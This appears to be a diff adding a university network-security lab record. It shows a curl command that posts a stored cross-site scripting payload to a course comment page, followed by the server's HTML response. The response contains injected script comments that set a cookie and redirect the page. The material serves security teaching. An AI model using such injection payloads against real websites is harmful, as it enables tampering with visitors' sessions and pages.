@@ -1,0 +1,38 @@
+
+~$ curl -d "comment=<script type=text/javascript>document.cookie="A"</script>" -X POST https://austmann.netsec.seclab-bonn.de/group-11/comments
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>NetSec Commentary System</title>
+  <style>
+    body {background-color: white;}
+    div.comment {background-color: gainsboro; margin: 15px 0px; padding: 10px; border: 1px solid gray;}
+</style>
+</head>
+
+<body>
+  <h1>NetSec Commentary System</h1>
+  <p>You can enter your NetSec comments below. We take your privacy very seriously...
+  that's why we delete your comments every five minutes...</p>
+  <h2>New Comment</h2>
+  <p>Enter your comments below:</p>
+  <form action="https://austmann.netsec.seclab-bonn.de/group-11/comments" method="post">
+    <textarea name="comment" rows="10" cols="30"></textarea>
+    <br>
+    <input type="submit" value="Submit comment">
+  </form>
+  <h2>Previous Comments</h2>
+
+  <div class="comment">
+    <script type=text/javascript>document.location=https://austmann.netsec-bonn.de/group-11/comments </script>
+  </div>
+
+  <div class="comment">
+    <script type=text/javascript>document.cookie=A</script>
+  </div>
+
+</body>
+</html>
+
+
